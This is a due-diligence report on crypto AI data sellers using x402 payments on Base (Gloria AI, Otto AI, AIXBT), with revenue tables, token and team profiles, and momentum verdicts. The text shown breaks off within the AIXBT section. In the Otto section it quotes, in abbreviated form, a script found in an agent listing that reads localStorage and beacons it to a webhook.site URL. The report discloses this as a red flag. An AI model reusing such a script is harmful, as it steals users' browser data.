# Token-bearing data and AI sellers on Base x402: due diligence (as of 2026-10-11)

**Status: final version, all sections proofread on 2026-10-11.** Items that could not be confirmed are listed under "Gaps" in each profile and flagged in the text as inference, self-reported or secondary.

Scope: Gloria AI, Otto AI, AIXBT, Cookie DAO, Venice, plus the other token-bearing data/AI sellers on Base that show x402 revenue. All access dates are 2026-10-11. "Window" means 2026-04-11 to 2026-10-11. No price or chart analysis is included.

## Method and data notes

- **x402 numbers** come from x402scan's public tRPC endpoints, the same ones its website calls: `public.sellers.bazaar.list` (origin ranking; Base; 30 days or all time), `public.transfers.list` (raw settled transfers filtered by payTo address), `public.stats.overall` / `public.stats.bucketed` (Base-wide totals), `public.origins.list.withResources` (registered endpoints and prices). Example: [x402scan Venice server page](https://www.x402scan.com/server/91642ccf-f8e5-4d4b-8e50-9664d6eb3665). Amounts are USDC with 6 decimals. x402scan's REST API (`/api/x402/*`) answers HTTP 402 (it is itself paid), so I did not use it and paid nothing. I only sent unpaid requests to read 402 challenges.
- **Base context** (x402scan `stats.overall`, 30 days to 2026-10-11): $702,249 across 2.17M transactions, 35,307 buyers, 39,328 sellers. Monthly Base totals from `stats.bucketed`: Apr $1.93M, May $1.03M, Jun $0.79M, Jul $0.65M, Aug $1.03M, Sep $0.57M, Oct 1-11 $0.25M. The ranked-origin list (registered servers) is a subset: the top 99 origins sum to $145,768 for the 30 days.
- **Real vs wash tests used**: number of distinct payers, repeat payers, share of the top payer, identical amounts repeated by a fixed wallet set, single-wallet "ping" traffic, abrupt starts and stops. These show patterns, not intent.
- **Limits**: the shared WebSearch budget ran out after 6 searches, so there are no news-site, Crunchbase, RootData, CryptoRank or Messari results. X/Twitter pages cannot be read; handles come from official sites, GitHub profile fields, Virtuals verified links, CoinGecko and docs. Telegram public previews (`t.me/s/...`) were used for dated posts. About 230 GitHub API calls were used. One fetched page (Otto's ERC-8004 listing) contained a script string; it was treated as data and verified (see Otto).
- **People policy**: only professional public information; pseudonymous handles are not linked to real identities. Where two handles might be the same person but no source says so, they are listed separately.

## Summary answers to the key questions

- **Gloria AI**: live news terminal, REST/WebSocket API, Telegram/Discord bots, MCP server (beta) and a small x402 API; run by the Crypto Briefing team (named lead John Chen). Token GLORIA on Base, launched via Virtuals on 2025-05-07. x402 is a side channel: $359 all-time on Base, $59 in the window, $1 in the last 30 days.
- **Otto AI**: live Base-first DeFi/market app, MCP server and an 84-endpoint x402 catalogue (from $0.001). Founder is pseudonymous. Token OTTO on Base, launched through Virtuals Unicorn on 2025-10-16. x402: $433 all-time, $404 in the window (43% from one bot wallet), $30 in the last 30 days.
- **AIXBT**: yes it sold through x402, briefly. Two Base endpoints registered Oct 2025 ($0.50 and $2.00); $2,766 all-time from 153 payers; last payment 2026-07-11; both endpoints return HTTP 404 on 2026-10-11. The business runs on API keys, subscriptions and a 600,000-token holder plan. Token AIXBT on Base (Virtuals, 2024-11-02).
- **Cookie DAO**: no x402 found anywhere (x402scan Base and Solana, Coinbase Bazaar, docs, site). The lead is wrong for x402. cookie.fun now redirects to "Cookie Pro", an AI research app with an API and MCP.
- **Venice**: yes. x402 works as wallet-authenticated pay-per-request against a prepaid USDC balance topped up by x402 (minimum $5). It is the only one of the five with real, repeated x402 payers: $5,250 of top-ups all-time from 201 payers (55 repeat), $3,103 in the last 30 days (#6 on x402scan's Base 30-day origin board). Still tiny next to Venice's claimed 2M API calls per day.
- **Other token-bearing sellers**: on x402scan's 30-day Base board the two biggest are Cluster Protocol (token CP on Base; $54.8k, but synthetic-looking) and dTelecom (token DTEL on Solana; $36.2k from about 25 wallets). Apart from those two and Venice, I found no seller with a confirmed Base token above $1,000 in 30 days (FortClaw, Keyring Agent and BotPay were not checked for tokens). Incumbent data sellers (Nansen, Messari, Arkham) earn tens to low hundreds of dollars a month and have no Base token.

### x402 snapshot (Base, x402scan, USDC)

| Project | All-time | Window (Apr 11 - Oct 11) | Last 30 days | First / last payment | Main caveat |
|---|---|---|---|---|---|
| Venice | $5,279 (3,450 tx) | $5,153 top-ups (488) | $3,103 (613 tx) | 2026-03-25 / 2026-10-11 | Two Sept top-ups = $1,787; 2,944 one-cent pings from one wallet |
| AIXBT | $2,766 (1,535 tx) | $354 (71 tx) | $0 | 2025-10-24 / 2026-07-11 | Endpoints now 404 |
| Otto | $433 (178,292 tx) | $404 (177,475 tx) | $30 (3,268 tx) | 2025-10-26 / 2026-10-11 | One wallet: 133,690 tx, 43% of window dollars |
| Gloria | $359 (19,158 tx) | $59 (1,809 tx) | $1.29 (28 tx) | 2025-06-12 / 2026-10-11 | One wallet = 63% of window dollars |
| Cookie DAO | $0 | $0 | $0 | none | No x402 footprint |
| Cluster Protocol | $262,248 (532,550 tx) | $262,248 | $54,756 (66,675 tx) | 2026-05-14 / 2026-10-10 | About 720 fixed wallets; stopped 2026-10-02 |
| dTelecom | $112,337 (52,881 tx) | $112,327 | $36,243 | 2026-02-10 / 2026-10-11 | About 25 recurring wallets |

### Follow recommendation

- **Check weekly**: Venice (changelog, x402scan top-ups, burn page). It is the clearest example of a real product adding an x402 door.
- **Check every month or two**: Otto (docs release history, x402 catalogue); Gloria and AIXBT only if their MCP/API news matters; Cluster Protocol once as a worked example of why volume rank is not demand.
- **Not worth following for x402**: Cookie DAO.

---

## 1. Gloria AI

### Takeaway
A small, real news-data product run by Crypto Briefing's team, with a Virtuals-launched token. x402 is a side channel producing almost no revenue, public engineering output is a single August burst, and the Q4 2025 roadmap items are not visible. Credible but small, slowing.

### One-line
Real-time crypto and macro news terminal and feed for traders and AI agents, delivered by API, WebSocket, bots, MCP and pay-per-call x402. ([Gloria press release, Sept 2025](https://thedefiant.io/news/press-releases/gloria-ai-launches-real-time-news-terminal-to-deliver-market-moving-intelligence), [itsgloria.ai](https://itsgloria.ai))

### x402 role
Seller / resource server. Four paid endpoints on `api.itsgloria.ai` priced $0.03 (`/news`), $0.031 (`/news-ticker-summary`), $0.05 (`/news-by-keyword`), $0.10 (`/recaps`), USDC on Base only ([Gloria x402 docs](https://gloriaai.gitbook.io/gloria/docs/gloria-data-platform/x402-integration.md), [x402scan resources](https://www.x402scan.com/server/c36d482c-4368-4b6b-ad83-7c410c1208b9)). The same four are repeated by a Daydreams "Lucid" agent at `lucid.itsgloria.ai` (ERC-8004 agent #18095) ([gloria-lucid-agent README](https://github.com/cryptobriefing-labs/gloria-lucid-agent)). The MCP server has 5 free tools and 2 x402 tools ([MCP page](https://www.itsgloria.ai/mcp)). It is registered as ERC-8004 agent #1317 on Base, last activity 2026-05-20, one feedback entry ([ERC-8004 explorer](https://erc-8004.quicknode.com/agents/base-mainnet/1317)).
**Central or side?** Side channel. The pricing page sells fiat-priced tiers: Free, Plus $9/mo, Elite $19/mo (50k API requests/month), Enterprise custom, with no x402 mention ([pricing](https://www.itsgloria.ai/pricing)).

### Chains
Base is primary: token on Base, x402 USDC on Base only, ERC-8004 agents on Base.

### Token
- GLORIA, Base, `0x3B313f5615Bbd6b200C71f84eC2f677B94DF8674`, supply 1,000,000,000 ([tokenomics](https://gloriaai.gitbook.io/gloria/docs/tokenomics/tokenomics.md)).
- Launch: Virtuals bonding launch, created 2025-05-01, launched 2025-05-07 ([Virtuals API record 22418](https://api.virtuals.io/api/virtuals/22418)). 9,612 holders in that record. Method: Virtuals launchpad, not Clanker or VC-led.
- Allocation as of Feb 2026 per docs: public sale 37.5%, LP 12.5% (permanently locked), marketing/airdrop 5%, CEX/liquidity 6%, team 20% and early backers 4% (linear vesting since Sept 2025, ends about June 2026), treasury 15% (80% linear, ends about Aug 2026). So no team unlock remains pending as of this date.
- Stated utility: staking GLORIA gives premium plans, feeds, recaps and Telegram/Discord bots ([tokenomics](https://gloriaai.gitbook.io/gloria/docs/tokenomics/tokenomics.md)); the Virtuals page says premium tiers, API/WebSocket and bots come "by holding or staking $GLORIA".
- Does it do real work? Unproven. The docs state no staking tier amounts, the live pricing page is fiat-priced and shows no GLORIA amounts, and x402 is not token-gated. The Virtuals pool exists on-chain with non-zero reserves (Base RPC `getReserves`, 2026-10-11) although Dexscreener's token endpoint returned no pair.

### Team
- **John Chen**: project lead / core contributor; CEO of Crypto Briefing; X `@j0hnchen` (linked on the project's [Virtuals page](https://api.virtuals.io/api/virtuals/22418) and [team doc](https://gloriaai.gitbook.io/gloria/docs/introduction/the-team.md)); named in the press release as Core Contributor. Doxxed. Handle confidence: high (project-published).
- **Anu**: AI lead; LinkedIn link on the Virtuals page; no X. **Vlad Vilihura**: lead developer; LinkedIn on the docs team page. **Andrey**: lead architect; no link. **0xdieg**: AI/product; X `@0xdieg` on the docs team page; pseudonymous.
- GitHub (`cryptobriefing-labs`, created 2026-08-14): committers `jchen225` (profile name "jc225") and `goalmada` (company field "Prism Labs"). Neither profile sets an X handle. I did not link either to the team-page names.
- Parent context: Crypto Briefing was founded in 2017 by Han Kao, Jon Rice and Andre Cronje per its [About page](https://cryptobriefing.com/about/); first subscription product SIMETRI Research in 2019. Current involvement of the founders is not stated.

### Track record and pivots
- 2017: Crypto Briefing founded (above). 2019: SIMETRI Research subscription.
- Q3 2024: AI news discovery and publishing framework; Q1 2025: Gloria agent on X ([docs roadmap](https://gloriaai.gitbook.io/gloria/docs/roadmap/roadmap.md)).
- 2025-05-07: GLORIA launched on Virtuals; Q2 2025: data-platform API beta, Virtuals ACP and x402 integrations.
- 2025-09-04/05: News Terminal V1 press release ([Crypto Briefing](https://cryptobriefing.com/real-time-news-terminal-gloria/)).
- 2026-01-19/20: x402scan records for the four endpoints last updated (current prices). 2026-02-04: ERC-8004 registration ([explorer](https://erc-8004.quicknode.com/agents/base-mainnet/1317)).
- 2026-02-17/18: `gloria-mcp` and `gloria-lucid-agent` repos created; `gloria-mcp` v1.0.0 (2026-02-27), v1.0.1 (2026-03-12).
- 2026-07-13: `vera-mcp` created, an MCP for "Vera", a Polymarket prediction-markets signal API at `vera.cryptobriefing.com` ([README](https://github.com/cryptobriefing-labs/vera-mcp)).

### Trend-hopping score: 2
The product line stayed on news intelligence from 2024 to 2026 and grew new delivery channels as each became fashionable (Virtuals ACP, x402, ERC-8004, MCP, Lucid). The one topical add-on is the prediction-markets API (2026), which the roadmap had listed in 2025. Long focus and a media parent keep it at 2, not 1, because the token and each channel arrived on trend.

### Funding
No evidence of outside funding. It was incubated by Crypto Briefing; the token allocation shows 4% "early backers" with no names ([press release](https://thedefiant.io/news/press-releases/gloria-ai-launches-real-time-news-terminal-to-deliver-market-moving-intelligence), [tokenomics](https://gloriaai.gitbook.io/gloria/docs/tokenomics/tokenomics.md)). Funding databases could not be searched.

### Product and traction
- Live: terminal (beta label), API (Elite: 50k requests/month), WebSocket (enterprise), Telegram/Discord news bot, MCP (beta), x402 API, ACP agent (id 263).
- Project-claimed partners on the Virtuals page (undated, 2025): Kosher Capital (450+ trading agents), Velvet Capital (100k+ terminal users), Questflow/SANTA, Ethy AI. Not independently verified.
- Telegram group 1,722 members (2026-10-11). Virtuals holders 9,612.
- [x402scan Base](https://www.x402scan.com/server/c36d482c-4368-4b6b-ad83-7c410c1208b9) (raw transfers pulled 2026-10-11): $358.8 all-time, 19,158 tx, 231 payers. Monthly: Sep 2025 $4.20; Oct $10.82; Nov $51.70; Dec $57.19; Jan 2026 $100.55; Feb $66.36; Mar $8.52; Apr $9.46; May $5.23; Jun $39.94; Jul $1.88; Aug $0.51; Sep $1.32; Oct 1-11 $0.60. Window: $58.95, 1,809 tx, 76 payers; one wallet made 1,165 tx (63% of dollars). Peak was Nov 2025 to Feb 2026.

### Last six months (2026-04-11 to 2026-10-11)
- 2026-05-20: ERC-8004 agent #1317 last activity.
- 2026-06: 1,246 x402 tx from 47 payers, but one wallet = 1,165 of them.
- 2026-07-11: first `vera-mcp` commit (repo created 2026-07-13; 2 commits in July).
- 2026-08-07 to 08-25: 13 more commits across [gloria-mcp](https://github.com/cryptobriefing-labs/gloria-mcp) (8), [gloria-lucid-agent](https://github.com/cryptobriefing-labs/gloria-lucid-agent) (3), [vera-mcp](https://github.com/cryptobriefing-labs/vera-mcp) (2). `cryptobriefing-labs` org created 2026-08-14.
- 2026-08-18: Gloria MCP server published to the official MCP registry (`io.github.cryptobriefing-labs/gloria-mcp`, remote `mcp.itsgloria.ai/mcp`) ([registry](https://registry.modelcontextprotocol.io/v0/servers?search=gloria)).
- Undated: pricing tiers on the site; "Research" tab still marked "soon".
- GitHub commits per month (3 repos): Apr 0, May 0, Jun 0, Jul 2, Aug 13, Sep 0, Oct 0. Active contributors: 2. Releases in the window: none (last 2026-03-12). Last commit 2026-08-25. No team joins or departures announced. The core platform (`ai-hub.cryptobriefing.com`) is not public.

### Pace verdict
Slow and bursty. Six months show one three-week burst and no releases. Compare: Venice logs 218-267 changelog items a month and about 190 docs commits a month; BlockRun's router repo made 409 commits and a release every few days in the same period ([ClawRouter](https://github.com/BlockRunAI/ClawRouter)); a small AI-assisted team would normally show weekly commits. The tokenomics page is labelled "status as of Feb 2026".

### Direction
Stated (Virtuals page, 2025): News Terminal V2 (Q3 2025), prediction markets (Q3 2025), Alpha terminal V1 and vertical expansion (Q4 2025), signals beyond news (Q4 2025 / Q1 2026). Shipped: Terminal V1 (Sept 2025), MCP beta (2026), a separate prediction-markets API (Jul-Aug 2026). The Alpha terminal and vertical expansion are not visible. Slippage is 9 months or more. The direction is toward agent-facing data products, not toward x402 revenue.

### Competitors
On x402 news and market data: Otto charges $0.001 for `crypto-news` against Gloria's $0.03; Nansen ($1,119 all-time), Arkham ($1,005), Messari ($531) and Heurist Mesh ($1,618) all out-earn Gloria on x402scan, though all are tiny. Outside x402: Cookie Pro and AIXBT sell similar crypto-intel APIs with MCP. Ahead on revenue: Nansen, Arkham, Heurist. Ahead on price: Otto.

### Green and red flags
- Green: named, doxxed lead with a media distribution channel; live for 12+ months; team and backer vesting finished; ERC-8004 and official MCP registry listings; open-source MCP and Lucid agent repos.
- Red: x402 revenue near zero and dominated by one wallet; roadmap slip; no public changelog or releases in the window; token tier amounts unpublished; docs stale; partner numbers are self-reported; prices 30x Otto's for the same kind of call.

### Verdict
**Credible but small. Momentum: Slowing.** Crypto Briefing has a real audience and a working feed, and the team ships an MCP server and a prediction-markets side project. But the x402 line has faded to almost nothing since February 2026, the Q4 2025 promises are not visible, and everything public happened in one August push. I expect Gloria to keep existing as Crypto Briefing's AI data arm, with the token as an access wrapper, and not to become a meaningful x402 earner. Follow weekly at most; the Vera and MCP repos are the signal to watch.

### Tracking card
- Website https://www.itsgloria.ai; docs https://gloriaai.gitbook.io/gloria (README says docs.itsgloria.ai); blog/RSS none found; changelog none found.
- GitHub https://github.com/cryptobriefing-labs (gloria-mcp, gloria-lucid-agent, vera-mcp). `cryptobriefing` org has 0 public repos.
- X `@itsgloria_ai`, `@j0hnchen`, `@0xdieg`. Farcaster none found. Telegram https://t.me/itsgloria_ai; Discord https://discord.gg/UFa4HK2Vjv.
- Token `0x3B313f5615Bbd6b200C71f84eC2f677B94DF8674` (Base); Virtuals https://app.virtuals.io/virtuals/22418; ERC-8004 #1317 and #18095.
- x402scan origin `c36d482c-4368-4b6b-ad83-7c410c1208b9` (api.itsgloria.ai), payTo `0xca1271e777c209e171826a681855351f4989cd0c`, facilitators coinbase, payAI. REST base `ai-hub.cryptobriefing.com`; MCP `mcp.itsgloria.ai`. Dune: none found.

### Gaps
Staking tier amounts; early-backer identities; dated release notes (X and Discord unreadable); whether the Lucid endpoint takes payments (no separate x402scan origin found).

### Sources (accessed 2026-10-11)
https://thedefiant.io/news/press-releases/gloria-ai-launches-real-time-news-terminal-to-deliver-market-moving-intelligence ; https://cryptobriefing.com/real-time-news-terminal-gloria/ ; https://api.virtuals.io/api/virtuals/22418 ; https://gloriaai.gitbook.io/gloria/docs/ (x402-integration, tokenomics, roadmap, api-integration, the-team .md pages) ; https://www.itsgloria.ai , /pricing , /mcp ; https://erc-8004.quicknode.com/agents/base-mainnet/1317 ; https://github.com/cryptobriefing-labs/gloria-mcp , gloria-lucid-agent , vera-mcp ; https://registry.modelcontextprotocol.io/v0/servers?search=gloria ; https://cryptobriefing.com/about/ ; x402scan server and transfers data (Method note).

---

## 2. Otto AI

### Takeaway
A fast-moving, pseudonymous, token-linked product that documents its releases and keeps a large x402 catalogue current, but x402 revenue is a few hundred dollars and mostly bot traffic. The ERC-8004 listing carries a data-exfiltration script of unknown origin. Credible but small, steady.

### One-line
A Base-first "AI co-pilot and agent swarm" for onchain markets: dApp, MCP server and 84 pay-per-call x402 endpoints for market intel, DeFi data, tokenized-stock and SEC data, plus swap/bridge transaction preparation. ([useotto.xyz](https://useotto.xyz), [x402 catalogue](https://x402.ottoai.services))

### x402 role
Seller / resource server with an "x402 Open Router" (meta-intelligence routing, refunds through a feedback endpoint). 84 endpoints advertised, from $0.001; highest fixed prices $0.15 (`generate-meme`) and $0.10 (`llm-research`, `equity-smart-money-brief`); USDC on Base on all, Solana on 66 ([catalogue](https://x402.ottoai.services)). x402scan lists 96 resource records, last updated 2026-10-10 ([server page](https://www.x402scan.com/server/2a58f75f-bd11-4020-a347-0e1c7f4912ef)). Also ERC-8004 agent #1326 on Base, reputation 27 (medium confidence), 24 feedback entries none of which count ([explorer](https://erc-8004.quicknode.com/agents/base-mainnet/1326)).
**Central or side?** One of four channels (dApp, Virtuals ACP, MCP, x402). Central to the pitch to agents, immaterial to revenue.

### Chains
Base primary (token, x402 USDC). Also Solana (66 endpoints), Robinhood Chain, X Layer, Arbitrum, Polygon, Avalanche, BNB, Ethereum depending on feature ([supported networks](https://docs.useotto.xyz/introduction/supported-chains-integrations.md)). Base is $433 of x402 vs $2.23 on Solana.

### Token
- OTTO, Base, `0x380337d0180db7D0DF76ac4fAaE2fcea908EE1fC`, supply 1,000,000,000 ([$OTTO docs](https://docs.useotto.xyz/tokenomics/otto-token.md)).
- Launch: Virtuals "Unicorn" launchpad. Virtuals record created 2025-10-09, launched 2025-10-16 (`BONDING_V2`), 6,603 holders ([Virtuals API](https://api.virtuals.io/api/virtuals?filters[tokenAddress][$eqi]=0x380337d0180db7D0DF76ac4fAaE2fcea908EE1fC)).
- Allocations visible: team 250M (25%) vesting linearly from about 2026-10-07 to 2027-03-06; marketing 112.5M (released 2025-11-16 / 2025-12-16); hiring 112.5M (vested to 2026-05-10); sniper-tax buyback 80.7M (vested to 2026-09-14). About 31.6M OTTO sent to the dead address in 18 dated transfers (2025-10-23 to 2026-05-28); `totalSupply()` is unchanged.
- Stated utility then: DAO governance, token-gated tools, revenue-funded buybacks (Virtuals page). Stated utility now: holding 50,000 OTTO unlocks a scheduled Telegram "Daily Alpha & Intel Report" and holder research in Stocks; the docs say "Token-holder governance is not available" and describe no ongoing buyback. Real work: one threshold gating two perks.

### Team
- **Founder (self-declared, pseudonymous)**: Telegram profile "DeFAI_Cap | Otto AI Founder" at `t.me/DeFAI_Capital`; that account is the verified Telegram link on the Virtuals creator record for OTTO. No X handle confirmed. Confidence in the link: medium-high (two independent platform records). Not doxxed.
- Official accounts: X `@useOttoAI` (site, Virtuals verified link, GitHub profile field). GitHub user `useOttoAI` ("Otto AI", created 2026-02-05) and committer `Vb6Z` (no profile data) on `otto-x`.
- The docs name no team or owner ([security and audits](https://docs.useotto.xyz/safety-and-security/security-and-audits.md)).

### Track record and pivots
- Inception May 2025 per the Virtuals roadmap; brand history includes "Otto Wallet" (Medium handle `@ottowallet`; legacy docs host `docs.ottowallet.xyz` now has an expired TLS certificate).
- Release history ([docs](https://docs.useotto.xyz/introduction/otto-versions.md)): v0.1.0 DeFi/News agents; v0.2 send/swap/bridge; v0.6 Pendle routing, Hyperliquid perps; v0.8 Aave, wallet analysis, Points Season 1 (closed); Q2-Q3 2025 Virtuals ACP swarm V1.
- 2025-10-16 TGE; Oct-Nov 2025 Trade Execution Agent and x402 storefront (x402scan origin 2025-10-25, first payment 2025-10-26), Base/Farcaster mini-app; Dec 2025-Jan 2026 x402 endpoints expanded, ERC-8004 registrations (agent #1326 on 2026-02-04).
- Feb-Mar 2026 (v0.9.5) Telegram holder report, x402 repricing; May 2026 (v0.9.6) prediction-markets agent; Jul 2026 (v0.9.7) tokenized equities, Robinhood Chain movers, Avalanche, Otto X on OKX X Layer, Otto Intel MCP, ACP moved to `acp-cli`; Aug-Sep 2026 MCP transaction-prep tools, expanded x402 catalogue, stocks dashboard, SEC filings data.
- Hyperliquid trading retired (undated; no reason given): "no funding, new positions or order construction" through ACP, x402, MCP or skills ([page](https://docs.useotto.xyz/acp-swarm/hyperliquid.md)).

### Trend-hopping score: 4
Each hot narrative gets a feature within months: DeFAI/perps (2025), Virtuals ACP and a Virtuals token, x402, ERC-8004, Base mini-app, prediction markets, Robinhood Chain tokenized stocks, OKX X Layer, MCP. Each had real shipped code or endpoints, which keeps it from 5. One product line (Hyperliquid trading) was dropped.

### Funding
No evidence of VC or grant funding. Capital came from the Virtuals Unicorn token launch ("automated capital formation" via limit orders between $2M and $160M FDV; amounts raised not stated) ([$OTTO docs](https://docs.useotto.xyz/tokenomics/otto-token.md)).

### Product and traction
- Site (as of 2026-09-07): 273,603 agent interactions, 6,487+ wallets, "$18.3M+" transaction volume, which the page itself says is gross volume, not revenue ([useotto.xyz](https://useotto.xyz)). Telegram group 533 members.
- Independent audit of Otto's own code: "Not available" per its docs.
- [x402scan Base](https://www.x402scan.com/server/2a58f75f-bd11-4020-a347-0e1c7f4912ef) (raw transfers pulled 2026-10-11): $433.20 all-time, 178,292 tx, 1,279 payers. Window: $404.18, 177,475 tx, 1,219 payers; wallet `0x1cb8d145...` made 133,690 tx for $173 (43% of dollars, 75% of tx). Monthly dollars: Apr $22.51; May $35.66; Jun $35.66; Jul $224.75 (146,031 tx, bot spike); Aug $31.49; Sep $52.62; Oct 1-11 $4.03. Last 30 days: $30.35, 3,268 tx, 508 payers (board rank about 83). Excluding the top wallet the window is about $231.

### Last six months (2026-04-11 to 2026-10-11)
- 2026-04-12: `otto-x` repo created (OKX X Layer); 2026-04-15 first commit.
- 2026-05 (v0.9.6): prediction-markets agent; Hyperliquid perps/yield resources added to x402. 2026-05-27: `otto-base-mcp` repo (Base MCP skill). 2026-05-28: last listed token burns.
- 2026-06-11: `openclaw-skills` commits begin.
- 2026-07 (v0.9.7): swap and bridge merged (+Avalanche); tokenized-equity discovery; Robinhood Chain movers; x402 discovery paths and Agent Quickstart; ACP to `acp-cli`; Otto X listed on OKX; Otto Intel MCP.
- 2026-08/09: unsigned-transaction tools in the MCP; x402 catalogue to 84; stocks dashboard; Hyperliquid retirement; 2026-09-07 documentation correction (Stocks guide).
- 2026-09-14: sniper-tax buyback vesting ends. 2026-10-07: team token vesting starts.
- GitHub (own, non-fork repos; `skills` and `plugin-store` are forks of base/skills and okx/plugin-store and are excluded): [openclaw-skills](https://github.com/useOttoAI/openclaw-skills) 10 commits (Jun 2, Jul 3, Aug 2, Sep 3), [otto-x](https://github.com/useOttoAI/otto-x) 4 (Apr 1, Aug 3), [otto-base-mcp](https://github.com/useOttoAI/otto-base-mcp) 2 (May). Monthly total: Apr 1, May 2, Jun 2, Jul 3, Aug 5, Sep 3, Oct 0. Active contributors: 2 accounts. GitHub releases: none. Last public commit 2026-09-05. No joins or departures announced. The app and API code are not public.

### Pace verdict
Product pace is steady to fast on paper (a large documented release every one to three months), but public code is thin (about 16 original commits in six months) and the app is closed, so cadence cannot be checked. Venice and BlockRun ship in public daily or weekly; Otto looks like a small team shipping monthly, which is fine for its size but not "fast" by 2026 AI-assisted standards.

### Direction
Virtuals-page roadmap for 2026: Chrome extension, "Degen Den" pro tools, mobile app, multi-chain beyond EVM. Shipped instead: tokenized stocks, SEC data, MCP, X Layer, prediction markets; Solana reached only as an x402 payment option. No extension or mobile app found. The DAO governance and buyback promises are contradicted by the current docs. Direction has drifted from a "DeFAI co-pilot with a token flywheel" to an agent-facing market-data and transaction-prep toolkit.

### Competitors
Data: Nansen ($1,119 all-time, 590 payers), Arkham ($1,005), Messari ($531), Heurist Mesh ($1,618), Zapper, Gloria ($359). Execution tools: Bankr (covered elsewhere). Otto has the widest x402 catalogue and lowest prices of this group; Nansen and Arkham have the brands and cleaner revenue.

### Green and red flags
- Green: dated public release history; catalogue still updated on 2026-10-10; honest docs about missing audit and missing governance; ERC-8004 and x402 discovery done; open skills repos.
- Red: pseudonymous founder; no code audit; one bot wallet dominates x402 stats; trading product retired without explanation; token promises not delivered; "gross volume" headline metric; **the ERC-8004 explorer page for agent #1326 contains, inside the agent description, a string `<script>... localStorage ... navigator.sendBeacon("https://webhook.site/...")</script>` appended after the description text** (verified in the page source on 2026-10-11; the explorer escapes `<` so it is inert there; Gloria's listing has no such string; provenance unknown, could be Otto's metadata or a third party; the agent-card URL it cites returns "version not found"). Team token vesting begins this month.

### Verdict
**Credible but small. Momentum: Steady.** Otto ships real, documented features at a decent clip and keeps the biggest x402 catalogue in this group live. But the revenue is a rounding error, the founder is pseudonymous, the trading product that built the early user base was shut, and the token's headline utilities were quietly dropped. I read it as a team following each Base narrative with working code, with the token as an access wrapper; it will keep reinventing itself. Worth a monthly look as a catalogue of agent-priced APIs, not as evidence of x402 demand.

### Tracking card
- Website https://useotto.xyz; docs https://docs.useotto.xyz; changelog https://docs.useotto.xyz/introduction/otto-versions.md; x402 host https://x402.ottoai.services (`/.well-known/x402`, `/llm.txt`, `/otto-x402-catalog.json`); MCP https://mcp.ottoai.services/mcp; blog none (Medium `@ottowallet` unread).
- GitHub https://github.com/useOttoAI (openclaw-skills, otto-x, otto-base-mcp). X `@useOttoAI`; Telegram https://t.me/useOttoAI; founder contact `t.me/DeFAI_Capital`. Farcaster: Base mini-app only, handle not found. Discord none.
- Token `0x380337d0180db7D0DF76ac4fAaE2fcea908EE1fC`; Virtuals id 38861; ERC-8004 #1326.
- x402scan origin `2a58f75f-bd11-4020-a347-0e1c7f4912ef`; payTo Base `0x0e84ddedaae6a779c462c22a59f301ec31b6b808` (data) and `0x5bb4b0c766e0d5d791d9403fc275c22064709f68` (execution); Solana `6XcSfqJHr9vNW2vbiRaMqUYVm7shDgLepca54wUTDPN5`; facilitators coinbase, x402rs. Dune: none found.

### Gaps
Team identity and funding; who inserted the script string; revenue (ACP, swaps) outside x402; dates of the Hyperliquid retirement; closed-source commit activity.

### Sources (accessed 2026-10-11)
https://useotto.xyz ; https://x402.ottoai.services ; https://docs.useotto.xyz (llms.txt, otto-versions.md, otto-token.md, x402.md, hyperliquid.md, security-and-audits.md, supported-chains-integrations.md) ; https://api.virtuals.io/api/virtuals?filters[tokenAddress][$eqi]=0x380337d0180db7D0DF76ac4fAaE2fcea908EE1fC ; https://erc-8004.quicknode.com/agents/base-mainnet/1326 ; https://github.com/useOttoAI ; https://t.me/DeFAI_Capital ; https://www.coingecko.com/en/coins/otto-ai ; x402scan data (Method note).

---

## 3. AIXBT

### Takeaway
A big-brand, pseudonymous-founder crypto intelligence product whose business runs on API keys, subscriptions and a 600,000-token holder plan. It tried x402 in Oct 2025 ($2,766 total), stopped taking payments in July 2026, and its two x402 endpoints now return 404. Credible but small, steady.

### One-line
AI agent and product (X agent, terminal, API v3, MCP, ChatGPT/Claude/Grok/Hermes plugins) that tracks public social and market activity to surface developments on crypto projects and topics. ([AIXBT docs](https://docs.aixbt.tech))

### x402 role
Seller / resource server, legacy. x402scan has two Base resources registered 2025-10-29: `/x402/v1/projects` at $0.50 and `/x402/v1/agents/indigo` at $2.00 ([x402scan](https://www.x402scan.com/server/759e6f45-3f70-4549-a5fa-4bab1155aa5f)). On 2026-10-11 both returned HTTP 404 to unpaid GET and POST. The v3 OpenAPI schema still says an account's plan is "Null for x402 keys, which pay per request", but the docs, MCP page and Claude page describe only OAuth 2.1 and API keys ([llms-full.txt](https://docs.aixbt.tech/llms-full.txt)).
**Central or side?** Side channel, now apparently retired.

### Chains
Base primary. Token on Base, bridged to Ethereum (Stargate) and Solana (Wormhole) ([tokenomics](https://docs.aixbt.tech/resources/tokenomics)). x402 on Base only.

### Token
- AIXBT. Base `0x4F9Fd6Be4a90f2620860d680c0d4d5Fb53d1A825`; Ethereum `0x0D37aF9D8AE74F35F3A38bD2a08FcB29890Ca6d2`; Solana `14zP2ToQ79XWvc7FQpm4bRnp9d6Mp1rFfsUW3gpLcRX` ([docs](https://docs.aixbt.tech/resources/tokenomics), [CoinGecko](https://www.coingecko.com/en/coins/aixbt)).
- Launch: Virtuals bonding launch, 2024-11-02, ~998.9M supply, 413,800 holders ([Virtuals record 1199](https://api.virtuals.io/api/virtuals/1199)). Not Clanker, no VC round found.
- Utility: holding 600,000 AIXBT unlocks the "Holder" plan "subject to published limits, credits, and fair-use terms"; holder benefits are access-only (docs). The API schema lists plan sources as "subscription, holding 600k+ AIXBT, or a manual grant".
- Real work: yes, a concrete access gate (inference from docs).

### Team
- **rxbt** (pseudonymous founder/owner): Virtuals project record lists "Owner" with verified links X `@0rxbt`, GitHub `rxbt`, Telegram `@rxbtx`, bio "dev, trader, defi" ([Virtuals](https://api.virtuals.io/api/virtuals/1199)). GitHub `rxbt` (created 2021-05-07, 0 public repos) authored all 4 commits to `aixbt/aixbt-plugin` in Aug-Sep 2026, which ties it to the project. Confidence: high. Not doxxed.
- **rel-op** (GitHub "rel op"): sole author of 152 commits in the archived `aixbt/cli`; no X handle, no profile detail.
- Entity name "Aixbt Labs" appears in the project's Telegram notice; support is `support@aixbt.tech`. No other staff named.

### Track record and pivots
- 2024-11-02: token and agent launch on Virtuals; 2024-11-24: GitHub org created.
- Product path (most dates are not documented): X agent; web app (Ranks, Intel, Clusters, Momo, Alerts per aixbt.tech); API v2 with "recipes" (CLI repo created 2026-03-03); API v3 documented as the primary API by Aug 2026, plus MCP and plugins.
- 2025-10-24 to 10-29: first x402 payments and two x402 v1 endpoints.
